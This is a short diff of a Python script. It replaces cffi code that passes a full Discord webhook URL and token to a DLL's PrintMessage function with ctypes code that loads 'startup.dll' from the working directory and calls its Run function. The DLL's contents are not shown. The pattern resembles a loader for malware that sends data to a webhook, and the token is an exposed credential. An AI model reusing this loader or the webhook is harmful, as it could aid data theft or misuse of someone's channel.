@@ -1,15 +1,27 @@
-import cffi
+import ctypes
+import os
 
-# Initialize cffi
-ffi = cffi.FFI()
+def main():
+    # Load the shared library (DLL)
+    dll_path = os.path.join(os.getcwd(), "startup.dll")
+    try:
+        lib = ctypes.CDLL(dll_path)
+    except OSError as e:
+        print(f"Error loading DLL: {e}")
+        return
 
-# Load the DLL
-dll = ffi.dlopen("./mylibrary.dll")
+    # Call the `Run` function from the DLL
+    try:
+        result = lib.Run()
+    except AttributeError as e:
+        print(f"Error calling 'Run' function: {e}")
+        return
 
-# Define the function signature
-ffi.cdef("""
-    void PrintMessage(const char* arg);
-""")
+    # Handle the result
+    if result == 0:
+        print("Startup setup completed successfully.")
+    else:
+        print(f"An error occurred. Error code: {result}")
 
-# Call the function and pass a string
-dll.PrintMessage(b"https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe")
+if __name__ == "__main__":
+    main()
